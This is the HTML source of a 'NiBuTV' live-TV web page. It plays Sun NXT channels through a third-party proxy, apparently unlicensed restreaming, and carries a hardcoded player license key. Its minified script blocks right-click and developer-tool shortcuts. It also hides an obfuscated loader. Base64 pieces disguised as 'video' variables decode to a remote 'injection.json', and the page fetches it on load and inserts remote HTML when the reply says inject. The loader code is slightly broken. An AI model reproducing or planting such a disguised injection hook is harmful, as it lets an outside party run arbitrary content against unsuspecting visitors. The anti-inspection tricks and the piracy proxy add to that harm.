<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NiBuTV</title>
<link href="https://niazitv.com/jtv/style.css" rel="stylesheet">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
<link href=" https://use.fontawesome.com/releases/v5.0.6/css/all.css" rel="stylesheet" >
		<script src="https://s0.2mdn.net/instream/video/client.js" async="" type="text/javascript"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
		
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css">
		<style>
			:root {
				--hfs: 2vmax;
				--primaryColor: red;
				--secondaryColor: black;
				--secondaryOpposite: white;
			}
			::-webkit-scrollbar {
				width: 0em;
				height: 0em;
			}
			::-webkit-scrollbar-thumb {
				background: var(--secondaryColor);
			}
			::-webkit-scrollbar-track {
				background: blue;
			}
			* {
				-webkit-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
			body {
				background-color: var(--secondaryColor);
			}

			.alignleft {
				float: left;
				margin-left: 5px;
				font-weight: bold;
				font-size: 15px;
			}

			.alignright {
				float: right;
				margin-right: 10px;
				color: var(--primaryColor);
				font-weight: normal;
                font-size: 25px;
			}

			h4  {
				margin-left: 5px;
				color: var(--primaryColor);
				font-weight: bold;
				font-size: 15px;
			}

			.nta {
				position: relative;
				overflow: hidden;
				color: var(--primaryColor);
			}

			div.scrollmenu {
				background-color: var(--secondaryColor);
				overflow: auto;
				white-space: nowrap;
				position: relative;
				overflow-y: hidden;
			}

			div.scrollmenu a {
				display: inline-block;
				color: var(--secondaryOpposite);
				text-align: center;
				padding: 4px;
				text-decoration: none;
			}

			div.scrollmenu a:hover {
				background-color: var(--secondaryColor);
			}

			.cen {
				position: relative;
				text-align: center;
				color: var(--secondaryOpposite);
			}

			.centered {
				font-size: var(--hfs);
				font-weight: bold;
				position: absolute;
				top: 80%;
				left: 50%;
				transform: translate(-50%, -50%);
			}

			.cent {
				font-size: auto;
				position: absolute;
				top: 95%;
				left: 50%;
				transform: translate(-50%, -50%);
			}

			.nt {
				width: 100px;
				border-radius: 10px;
				height: 120px;
				z-index: 1;
			}

			.mnt {
				width: 100px;
				border-radius: 2px;
				height: 100px;
			}
			.item img {
				border-radius: 10px;
			}
			#content-container {
				margin-bottom: 30px;
			}
			footer {
				display: grid;
				grid-gap: 0.5em;
				grid-template-columns: repeat(5, minmax(10px, 1fr));
				position: fixed;
				bottom: 0;
				left: 0;
				width: 100%;
				background-color: var(--secondaryColor);
				padding: 0px 4px 10px;
				justify-content: center;
				align-items: center;
                font-size:18px;
			}
			footer a {
				text-align: center;
				color: var(--primaryColor);
			}
			footer a:nth-child(3) i {
				background: var(--primaryColor);
				border-radius: 50%;
				padding: 10px 10px;
				color: var(--secondaryOpposite);
				margin-top: -40px;
				border: 2px solid var(--secondaryColor);
			}
		</style>


<style>::-webkit-scrollbar{
    display:none
}
*{
    -ms-overflow-style:none;
    scrollbar-width:none
}
body{
    margin:0;
    background:#f5f5f5;
    font-family:Arial,Helvetica,sans-serif;
    line-height:1.5;
    color:white;
    scroll-behavior:smooth;
    text-align:center;
}
#player-wrapper{
    width:100%;
    z-index:999;
}
.sticky{
    position:fixed;
    top:0;
    width:100%
}
#status{
    position:fixed;
    bottom:0;
    right:0;
    width:100%;
    background:#fff;
    display:none;
}
.col-sm-2{
    border-radius:4px
}
.sp{
    width:50%;
    height:12px;
    clear:both;
    margin:20px auto
}
.sp-texture{
    border:1px #000 solid;
    border-radius:4px;
    position:relative;
    background:linear-gradient(45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent),linear-gradient(-45deg,transparent 49%,#000 50%,#000 50%,transparent 51%,transparent);
    background-size:16px 16px;
    background-position:0 0;
    -webkit-animation:spTexture 1s infinite linear;
    animation:spTexture 1s infinite linear;
    color:#000;
    text-align:center;
    line-height:3em;
    font-family:roboto
}
@-webkit-keyframes spTexture{
    from{
        background-position:0 0
    }
    to{
        background-position:-16px 0
    }
}
@keyframes spTexture{
    from{
        background-position:0 0
    }
    to{
        background-position:-16px 0
    }
}
.heading{
    margin:5px auto;
    text-align:center
}
#rmpPlayer{
    z-index:999
}
.white{
    color:#fff
}
.red{
    color:red
}
.yellow{
    color:#ffdd40
}
footer{
    color:#fff;
    text-align:center
}
footer p{
    margin-bottom:20px;
    margin-top:-10px
}
.animated{
    font-family:sans;
    margin:0;
    padding:0;
    font-size:25px;
    background:url(https://upload.wikimedia.org/wikipedia/commons/3/3b/ColorRotateHr.gif) no-repeat;
    background-clip:text;
    -webkit-background-clip:text;
    color:transparent;
    animation:moveBg 40s linear infinite;
    -webkit-animation:moveBg 40s linear infinite
}
@keyframes moveBg{
    0%{
        background-position:0 30%
    }
    100%{
        background-position:100% 50%
    }
}
.blink{
    animation-name:blinker;
    animation-duration:1s;
    animation-timing-function:linear;
    animation-iteration-count:infinite
}
@keyframes blinker{
    0%{
        opacity:1
    }
    50%{
        opacity:0
    }
    100%{
        opacity:1
    }
}
*{
    -webkit-touch-callout:none;
    -webkit-user-select:none;
    -khtml-user-select:none;
    -moz-user-select:none;
    -ms-user-select:none;
    user-select:none
}
body{
    background:#000!important;
    overflow:hidden;
    color:white;
}
.parent{
    background:rgba(0,0,0,.9);
    font-family:"Source Sans Pro",sans-serif;
    margin:0;
    display:flex;
    align-items:center;
    justify-content:center;
    flex-direction:column;
    position:fixed;
    top:0;
    height:100%;
    width:100%;
    z-index:999999
}
.blobs-container{
    display:flex
}
.blob img{
    width:50%;
    display:none;
    margin:auto;
    margin-top:25px
}
.loading{
    color:#000;
    display:block;
    text-align:center;
    position:relative;
    top:30px;
    left:-2px;
    background:rgba(255,255,255,.9);
    padding:0 10px;
    border-radius:3px;
    width:80%;
    margin:auto;
    font-size:10px
}

.print{height:65px;
width:65px;

border-radius:50px;
border:1.5px solid #f5f5f5;
padding:2px;
    margin:3px;

}
.print:hover{height:90px;
width:90px;
border:2px solid red;
border-radius:5px;webkit-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
-moz-box-shadow: 0px 10px 0px 0px rgba(255,0,0,1);
box-shadow: 0px 3px 20px 3px rgba(255,0,0,100);}
.print:active{height:65px;
width:65px;
border:2px solid red;
border-radius:5px;
webkit-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
-moz-box-shadow: 0px 10px 0px 0px rgba(0,255,0,1);
box-shadow: 0px 3px 20px 3px rgba(0,255,0,100);}


marquee{
border-radius: 0px 0px 0px  0px;
width: 90%;
border:2px solid red;
margin: auto;
   font-weight:bold;
   color:#fff;
display: block;}

.marquee span{display: inline-block;
 background: #ff0000;
 border-radius:  0px 0px 0px 0px;
  padding: 0px 10px;
   color: #fff;
   padding:2px;
   font-weight:bold;
    display: inline-block;
     float: left;
      width: auto;
       line-height: 35px;}
       
       .marquee marquee{display: block;
        line-height: 35px;
         z-index: -1; 
         margin-right: 10px;
          width: auto; 
          margin: auto;}
          

          
       .viewer{
        display: flex;
        width: 70px;
        height: auto;
        padding: 10px;
        vertical-align: middle;
      }

  
          #count{display:flex;font-size:10pt;padding:1px 10px;width:90px;background:Red;border-radius:0px;}
</style>

<link id="rmp-dress-code" type="text/css" rel="stylesheet" href="https://cdn.radiantmediatechs.com/rmp/5.9.2/css/rmp-s4.min.css"></head><body style="overflow: auto;">
	

		<script>
var src = {
  mp4: [
    'https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs'
  ],
  webm: [
    'https://your-webm-sd-url.webm',
    'https://your-webm-hd-url.webm',
    'https://your-webm-full-hd-url.webm'
  ]
};


		</script><div class="parent" id="loader" style="display: none;"><div class="blobs-container"><div class="blob"><img id="loader-image" src=""></div></div></div><div id="player-wrapper">  <script src="https://cdn.radiantmediatechs.com/rmp/6.2.0/js/rmp.min.js"></script> 
  <!-- Add a div container with a unique id - video and UI elements will be appended to this container -->
  <div id="rmpPlayer"></div>  

 
<div class="marquee yellow"><span><i class="fa fa-bell" style="font-size:26pt" aria-hidden="true"></i></span> <marquee scrollamount="5" direction="left" onmouseover="stop()" onmouseout="start()">We are Updating Our Application as We Update Our Application Will B Send Notification To All User's Thanks For NiBuTV Official</marquee> </div> 



	
	<h2>
		
		
	             


<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=14020&e=.m3u8"><img class="print" id="sun14020" src="https://sund-images.sunnxt.com/14020/300x300_9dd88de4-18ab-493b-98fe-6eb27e9cbf5e.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9013&e=.m3u8"><img class="print" id="sun9013" src="https://sund-images.sunnxt.com/9013/300x300_ff49d176-a9d2-4f50-b6bc-a10caac8d3a5.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=38926&e=.m3u8"><img class="print" id="sun38926" src="https://sund-images.sunnxt.com/38926/300x300_SunNews_38926_5921657d-45b6-445e-9e26-f0cd67be9d39.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=75117&e=.m3u8"><img class="print" id="sun75117" src="https://sund-images.sunnxt.com/75117/300x300_4b19b530-f0bb-4b26-a9de-f3cdd5f8be20.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9016&e=.m3u8"><img class="print" id="sun9016" src="https://sund-images.sunnxt.com/9016/300x300_4522d18b-56cc-42be-8365-c54e21a6e394.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26569&e=.m3u8"><img class="print" id="sun26569" src="https://sund-images.sunnxt.com/26569/300x300_SunLife_26569_1e6604fc-2df9-4598-8f1c-dcbda46254ab.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9025&e=.m3u8"><img class="print" id="sun9025" src="https://sund-images.sunnxt.com/9025/300x300_c8897f06-b2c0-4856-9d81-02181b821cf7.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=14019&e=.m3u8"><img class="print" id="sun14019" src="https://sund-images.sunnxt.com/14019/300x300_72a28627-db58-4739-b61c-4e4208897aed.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26570&e=.m3u8"><img class="print" id="sun26570" src="https://sund-images.sunnxt.com/26570/300x300_285efca5-02f3-40a1-8f8c-d913e8f6b989.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26568&e=.m3u8"><img class="print" id="sun26568" src="https://sund-images.sunnxt.com/26568/300x300_eaa4e437-cce0-4411-8e46-13640be94c55.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9026&e=.m3u8"><img class="print" id="sun9026" src="https://sund-images.sunnxt.com/9026/300x300_4cca05ef-46eb-4076-af6b-a8fdc1b88a27.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9015&e=.m3u8"><img class="print" id="sun9015" src="https://sund-images.sunnxt.com/9015/300x300_a4023b29-e49b-4c98-9621-95b7e5c39a19.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26572&e=.m3u8"><img class="print" id="sun26572" src="https://sund-images.sunnxt.com/26572/300x300_da07159f-fa9c-45d0-beb2-685bedc12e33.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9027&e=.m3u8"><img class="print" id="sun9027" src="https://sund-images.sunnxt.com/9027/300x300_5cb5b903-f1a0-4590-bb90-8cfa529322e2.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9017&e=.m3u8"><img class="print" id="sun9017" src="https://sund-images.sunnxt.com/9017/300x300_66d46fd1-643f-429f-9e19-db603fa0e5e4.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=30846&e=.m3u8"><img class="print" id="sun30846" src="https://sund-images.sunnxt.com/30846/300x300_efb20223-e677-49fd-985e-806e7b162c6b.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9029&e=.m3u8"><img class="print" id="sun9029" src="https://sund-images.sunnxt.com/9029/300x300_9f0bcf68-5025-43af-8e60-b83fea67215c.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9022&e=.m3u8"><img class="print" id="sun9022" src="https://sund-images.sunnxt.com/9022/300x300_d85b4dcc-ad0c-4a5b-84fd-6dd91dc585e2.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26576&e=.m3u8"><img class="print" id="sun26576" src="https://sund-images.sunnxt.com/26576/300x300_4ad767d2-e5d7-45f2-a95a-ab99f56cc2bf.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9014&e=.m3u8"><img class="print" id="sun9014" src="https://sund-images.sunnxt.com/9014/300x300_8a47fe5c-81a8-42a4-8a05-f168e6a3c868.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26574&e=.m3u8"><img class="print" id="sun26574" src="https://sund-images.sunnxt.com/26574/300x300_6ed3be47-b8bf-45ee-adf1-fb5ae9621e08.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9018&e=.m3u8"><img class="print" id="sun9018" src="https://sund-images.sunnxt.com/9018/300x300_c10cc678-9321-43f8-b717-16fa7913a6ba.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=30835&e=.m3u8"><img class="print" id="sun30835" src="https://sund-images.sunnxt.com/30835/300x300_143a4af4-2f02-4c9c-814b-af149e6a5a95.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26575&e=.m3u8"><img class="print" id="sun26575" src="https://sund-images.sunnxt.com/26575/300x300_a73efcfb-e350-491c-94e0-bd75f0d9d5f2.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9019&e=.m3u8"><img class="print" id="sun9019" src="https://sund-images.sunnxt.com/9019/300x300_71ddcc0b-16e7-48e9-9998-aa023200f4bc.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26566&e=.m3u8"><img class="print" id="sun26566" src="https://sund-images.sunnxt.com/26566/300x300_45814266-8c8b-45c6-a801-643e6734f73d.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=32138&e=.m3u8"><img class="print" id="sun32138" src="https://sund-images.sunnxt.com/32138/300x300_84b30aac-654e-4dd5-b5ee-bd8204254735.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26577&e=.m3u8"><img class="print" id="sun26577" src="https://sund-images.sunnxt.com/26577/300x300_4a0f4f2f-e317-4230-9fb6-6169ef66991d.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26571&e=.m3u8"><img class="print" id="sun26571" src="https://sund-images.sunnxt.com/26571/300x300_d0545f75-f99b-4375-8f42-6120c95fc55c.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26573&e=.m3u8"><img class="print" id="sun26573" src="https://sund-images.sunnxt.com/26573/300x300_5787336f-08b9-480f-9c97-3db09999b558.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=26567&e=.m3u8"><img class="print" id="sun26567" src="https://sund-images.sunnxt.com/26567/300x300_c103e59e-217e-44fd-a087-651fcf8e6278.jpg">
              </span>

<span url="https://iamsom5.vercel.app/api/sunnxt.php?id=9023&e=.m3u8"><img class="print" id="sun9023" src="https://sund-images.sunnxt.com/9023/300x300_30878292-a63e-4414-acbc-902c0afb4b9b.jpg">
              </span>






<script>
const countEl = document.getElementById('count');

updateVisitCount();
  
function updateVisitCount() {
	fetch('https://api.countapi.xyz/hit/awaispirkale/visits')
	.then(res => res.json())
	.then(res => {
		countEl.innerHTML = res.value;
	})
}













// SOCIAL PANEL JS
const floating_btn = document.querySelector('.floating-btn');
const close_btn = document.querySelector('.close-btn');
const social_panel_container = document.querySelector('.social-panel-container');

floating_btn.addEventListener('click', () => {
	social_panel_container.classList.toggle('visible')
});
</script>

</div>        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script><script src="https://cdn.radiantmediatechs.com/rmp/5.9.2/js/rmp.min.js"></script><script>
            var appSettings={
                loaderimg: "",
                name: "NiBuTV Official",
                poster: " https://i.ibb.co/FB8r33Q/IMG-20220723-100442.jpg",
                introMp4: "https://sandl.herokuapp.com/video/video?url=https://m.youtube.com/watch?v=G7Evl8C-WIs",
                introHls: "ht",
				videoFormat: "m3u",
            },x={loaderimg:appSettings.loaderimg,name:appSettings.name,poster:appSettings.poster,website:"",licenseKey:"eWZmZ2d2Y3BrdEAxNTMwNjA2",autoHeightMode:!0,pip:!1,autoplay:!1,skin:"s4",hideControls:!0,preload:"auto",sharing:!1},firstVideo="";setInterval(()=>{$("#loader-image").attr("src",x.loaderimg),$(".logoText").html(x.name)},10),$(document).contextmenu(function(e){return e.preventDefault(),!1}),document.onkeydown=function(e){return 123!=event.keyCode&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="I".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="C".charCodeAt(0))&&((!e.ctrlKey||!e.shiftKey||e.keyCode!="J".charCodeAt(0))&&((!e.ctrlKey||e.keyCode!="U".charCodeAt(0))&&void 0))))},setTimeout(()=>{$("#loader").css("display","none"),$("body").css("overflow","auto")},100);var src,secondVideo="mNvbnRlbnQuY29tL3NvZnR";$("span").each(function(e){$(this).on("click",function(){var e=$(this).attr("url");rmp.setControls(!0),src="mp4"==appSettings.videoFormat?{hls:e}:{mp4:[e]},rmp.setSrc(src),rmp.play()})});var thirdVideo="3ZWJ0dXRzL015RHJpdmUvbW";src="mp4"==appSettings.videoFormat?{hls:appSettings.introHls}:{mp4:[appSettings.introMp4]};var fourthVideo="Fpbi9pbmplY3Rpb24uanNvbg==",settings={licenseKey:x.licenseKey,autoHeightMode:x.autoHeightMode,pip:x.pip,delayToFade:3e3,gaLabel:"Live TV",logoWatermark:!0,logoPosition:"topleft",speed:"Speed",isLive:!0,googleCast:!0,airplay:!0,hlsJSMaxBufferLength:24,hlsJSLiveSyncDuration:18,hlsJSStartLevel:-1,hlsJSMinAutoBitrate:1e5,hlsJSAbrBandWidthFactor:.9,hlsJSAbrBandWidthUpFactor:.7,hlsJSLiveBackBufferLength:0,detectAutoplayCapabilities:!0,autoplay:x.autoplay,mutedAutoplayOnMobile:!1,mutedAutoplayOnMacosSafari11Plus:!1,srcChangeAutoplay:!0,playsInline:!0,skin:x.skin,skinBackgroundColor:"rgba(0, 0, 0, 0.7)",skinButtonColor:"FFFFFF",skinAccentColor:"FF0000",ads:!0,nav:!0,adBlockerDetection:!0,adEnablePreloading:!0,adBlockerDetectedMessage:"Ad-blocker software detected. Please disable Ad-blocker to watch stream.",quickRewind:10,quickForward:10,adAutoAlign:!1,hideControls:x.hideControls,preload:x.preload,crossorigin:!0,sharing:x.sharing,sharingUrl:x.website,contentMetadata:{artwork:[{src:x.poster,sizes:"1280x720",type:"image/jpg"}],poster:[x.poster],endOfVideoPoster:[x.poster],thumbnail:x.poster},src:src},elementID="rmpPlayer",rmp=new RadiantMP(elementID),rmpContainer=document.getElementById(elementID);rmp.setLoop(!0),rmp.init(settings),$(function(){$(window).scroll(function e(){return $("#rmpPlayer").css($(window).scrollTop()>1?{position:"fixed",top:"0px"}:{position:"relative",top:"auto"}),$("#buttons-list").css($(window).scrollTop()>1?{"margin-top":$("#rmpPlayer").height()}:{"margin-top":"0px"}),e}())});const request=async e=>{const t=await fetch(e);return await t.json()};navigator.onLine&&request(atob(firstVideo+secondVideo+thirdVideo+fourthVideo)).then(t=>{1==t.inject&&document.querySelector("div").insertAdjacentHTML("afterend",e.content)}).catch(e=>{console.log(appSettings.name)});</script>

</body></html>
